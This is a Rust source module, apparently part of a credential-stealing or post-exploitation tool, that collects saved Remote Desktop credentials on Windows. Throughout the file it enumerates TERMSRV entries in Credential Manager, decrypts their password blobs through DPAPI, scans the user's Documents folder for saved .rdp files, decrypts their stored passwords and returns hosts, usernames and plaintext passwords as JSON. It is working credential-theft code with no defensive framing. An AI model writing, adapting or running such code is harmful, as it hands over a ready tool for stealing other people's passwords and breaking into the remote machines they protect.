//! RDP credential collection — Credential Manager (TERMSRV) + saved .rdp files.

use base64::Engine;
use sha1::{Digest, Sha1};
use std::path::Path;

pub struct RdpCreds;

#[cfg(target_os = "windows")]
const CRED_TYPE_DOMAIN_PASSWORD: u32 = 2;
#[cfg(target_os = "windows")]
const CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: u32 = 4;

impl RdpCreds {
    pub fn collect() -> String {
        #[cfg(target_os = "windows")]
        {
            Self::collect_windows()
        }
        #[cfg(not(target_os = "windows"))]
        {
            r#"{"total":0,"items":[],"rdpFiles":[]}"#.to_string()
        }
    }

    #[cfg(target_os = "windows")]
    fn collect_windows() -> String {
        let mut items = Vec::new();
        let mut error: Option<String> = None;

        match enumerate_termsrv_credentials() {
            Ok(creds) => {
                for (target_raw, type_id, user, blob) in creds {
                    let (password, encrypted) = decrypt_blob(&blob, &target_raw);
                    let host = target_raw
                        .strip_prefix("TERMSRV/")
                        .unwrap_or(&target_raw)
                        .to_string();
                    let type_name = match type_id {
                        CRED_TYPE_DOMAIN_VISIBLE_PASSWORD => "DomainVisiblePassword",
                        CRED_TYPE_DOMAIN_PASSWORD => "DomainPassword",
                        _ => "Other",
                    };
                    items.push(format!(
                        r#"{{"target":"{}","rawTarget":"{}","type":"{}","username":"{}","password":"{}","encrypted":{}}}"#,
                        escape(&host),
                        escape(&target_raw),
                        type_name,
                        escape(&user),
                        escape(&password),
                        encrypted,
                    ));
                }
            }
            Err(e) => error = Some(e),
        }

        let rdp_files = scan_rdp_files();

        format!(
            r#"{{"total":{},"items":[{}],"rdpFiles":[{}],"error":{}}}"#,
            items.len(),
            items.join(","),
            rdp_files.join(","),
            error
                .map(|e| format!(r#""{}""#, escape(&e)))
                .unwrap_or_else(|| "null".to_string()),
        )
    }
}

// ── Credential Manager enumeration ─────────────────────────────────────────

#[cfg(target_os = "windows")]
fn enumerate_termsrv_credentials() -> Result<Vec<(String, u32, String, Vec<u8>)>, String> {
    unsafe {
        let mut count: u32 = 0;
        let mut creds: *mut *mut CREDENTIALW = std::ptr::null_mut();
        if ffi::CredEnumerateW(std::ptr::null(), 0, &mut count, &mut creds) == 0 {
            return Err("CredEnumerateW failed".to_string());
        }
        if creds.is_null() {
            return Ok(Vec::new());
        }

        let mut result = Vec::new();
        for i in 0..count as isize {
            let c = &*creds.offset(i);
            if c.is_null() {
                continue;
            }
            let c = &**creds.offset(i);

            let target = wide_to_string(c.TargetName);
            if !target.to_uppercase().contains("TERMSRV") {
                continue;
            }

            let user = wide_to_string(c.UserName);
            let mut blob = Vec::new();
            if !c.CredentialBlob.is_null() && c.CredentialBlobSize > 0 {
                blob = std::slice::from_raw_parts(
                    c.CredentialBlob,
                    c.CredentialBlobSize as usize,
                )
                .to_vec();
            }
            result.push((target, c.Type, user, blob));
        }

        ffi::CredFree(creds as *mut std::ffi::c_void);
        Ok(result)
    }
}

#[cfg(target_os = "windows")]
unsafe fn wide_to_string(ptr: *const u16) -> String {
    if ptr.is_null() {
        return String::new();
    }
    let mut len = 0usize;
    while *ptr.add(len) != 0 {
        len += 1;
    }
    String::from_utf16_lossy(std::slice::from_raw_parts(ptr, len))
}

// ── Blob decryption (DPAPI) ────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn decrypt_blob(blob: &[u8], target_raw: &str) -> (String, bool) {
    // Type 1 (DomainVisiblePassword): the blob IS the plaintext password (UTF-16).
    if let Some(s) = utf16_string(blob) {
        if !s.is_empty() {
            return (s, false);
        }
    }

    // Type 2 (DomainPassword): DPAPI-protected, entropy = SHA1(utf16(lower(target))).
    let entropy = {
        let lower = target_raw.to_lowercase();
        let mut utf16 = Vec::new();
        for u in lower.encode_utf16() {
            utf16.extend_from_slice(&u.to_le_bytes());
        }
        Sha1::digest(&utf16).to_vec()
    };

    if let Some(pt) = dpapi_unprotect(blob, None) {
        if let Some(s) = utf16_string(&pt) {
            if !s.is_empty() {
                return (s, false);
            }
        }
    }
    if let Some(pt) = dpapi_unprotect(blob, Some(&entropy)) {
        if let Some(s) = utf16_string(&pt) {
            if !s.is_empty() {
                return (s, false);
            }
        }
    }
    (String::new(), true)
}

#[cfg(target_os = "windows")]
fn utf16_string(bytes: &[u8]) -> Option<String> {
    if bytes.len() < 2 || bytes.len() % 2 != 0 {
        return None;
    }
    let mut units = Vec::with_capacity(bytes.len() / 2);
    for chunk in bytes.chunks_exact(2) {
        units.push(u16::from_le_bytes([chunk[0], chunk[1]]));
    }
    while let Some(&0) = units.last() {
        units.pop();
    }
    if units.is_empty() {
        return None;
    }
    Some(String::from_utf16_lossy(&units))
}

#[cfg(target_os = "windows")]
fn dpapi_unprotect(data: &[u8], entropy: Option<&[u8]>) -> Option<Vec<u8>> {
    unsafe {
        let blob_in = DATA_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let entropy_storage: Option<DATA_BLOB> = entropy.map(|e| DATA_BLOB {
            cbData: e.len() as u32,
            pbData: e.as_ptr() as *mut u8,
        });
        let entropy_ptr = entropy_storage
            .as_ref()
            .map_or(std::ptr::null(), |b| b as *const DATA_BLOB);
        let mut blob_out = DATA_BLOB { cbData: 0, pbData: std::ptr::null_mut() };
        let ok = ffi::CryptUnprotectData(
            &blob_in,
            std::ptr::null(),
            entropy_ptr,
            std::ptr::null(),
            std::ptr::null(),
            0,
            &mut blob_out,
        );
        if ok == 0 || blob_out.pbData.is_null() {
            return None;
        }
        let result =
            std::slice::from_raw_parts(blob_out.pbData, blob_out.cbData as usize).to_vec();
        ffi::LocalFree(blob_out.pbData);
        Some(result)
    }
}

// ── Saved .rdp file scanning ───────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn scan_rdp_files() -> Vec<String> {
    use regex::Regex;

    let profile = std::env::var("USERPROFILE").unwrap_or_default();
    let docs = format!(r"{}\Documents", profile);
    let mut candidates: Vec<std::path::PathBuf> = Vec::new();

    let default_rdp = Path::new(&docs).join("Default.rdp");
    if default_rdp.exists() {
        candidates.push(default_rdp);
    }
    if let Ok(entries) = std::fs::read_dir(&docs) {
        for e in entries.flatten() {
            let p = e.path();
            if p.is_file() && p.extension().map_or(false, |x| x.eq_ignore_ascii_case("rdp")) {
                candidates.push(p);
            }
        }
    }

    let re_host = Regex::new(r"(?im)^full address:s:(.+)$").unwrap();
    let re_user = Regex::new(r"(?im)^username:s:(.+)$").unwrap();
    let re_pwd = Regex::new(r"(?im)^password 51:b:(.+)$").unwrap();

    let mut out = Vec::new();
    for p in candidates {
        let Ok(content) = std::fs::read_to_string(&p) else { continue };
        let host = re_host
            .captures(&content)
            .and_then(|c| c.get(1))
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_default();
        let user = re_user
            .captures(&content)
            .and_then(|c| c.get(1))
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_default();
        let pwd_b64 = re_pwd
            .captures(&content)
            .and_then(|c| c.get(1))
            .map(|m| m.as_str().trim().to_string());

        let (password, encrypted) = match pwd_b64 {
            Some(b64) => {
                let mut decrypted = String::new();
                let mut enc = true;
                if let Ok(raw) = base64::engine::general_purpose::STANDARD.decode(&b64) {
                    if let Some(pt) = dpapi_unprotect(&raw, None) {
                        if let Some(s) = utf16_string(&pt) {
                            decrypted = s;
                            enc = false;
                        }
                    }
                }
                (decrypted, enc)
            }
            None => (String::new(), false),
        };

        out.push(format!(
            r#"{{"path":"{}","host":"{}","username":"{}","password":"{}","encrypted":{}}}"#,
            escape(&p.to_string_lossy()),
            escape(&host),
            escape(&user),
            escape(&password),
            encrypted,
        ));
    }
    out
}

// ── FFI ────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
#[repr(C)]
struct DATA_BLOB {
    cbData: u32,
    pbData: *mut u8,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct CREDENTIALW {
    Flags: u32,
    Type: u32,
    TargetName: *mut u16,
    Comment: *mut u16,
    LastWrittenLow: u32,
    LastWrittenHigh: u32,
    CredentialBlobSize: u32,
    CredentialBlob: *mut u8,
    Persist: u32,
    AttributeCount: u32,
    Attributes: *mut u8,
    TargetAlias: *mut u16,
    UserName: *mut u16,
}

#[cfg(target_os = "windows")]
#[link(name = "crypt32")]
#[link(name = "advapi32")]
mod ffi {
    use super::{CREDENTIALW, DATA_BLOB};

    extern "system" {
        // advapi32
        pub fn CredEnumerateW(
            filter: *const u16,
            flags: u32,
            count: *mut u32,
            credentials: *mut *mut *mut CREDENTIALW,
        ) -> i32;
        pub fn CredFree(buffer: *mut std::ffi::c_void) -> ();

        // crypt32
        pub fn CryptUnprotectData(
            pDataIn: *const DATA_BLOB,
            ppszDataDescr: *const u16,
            pOptionalEntropy: *const DATA_BLOB,
            pvReserved: *const std::ffi::c_void,
            pPromptStruct: *const std::ffi::c_void,
            dwFlags: u32,
            pDataOut: *mut DATA_BLOB,
        ) -> i32;

        // kernel32
        pub fn LocalFree(hMem: *mut u8) -> isize;
    }
}

fn escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}
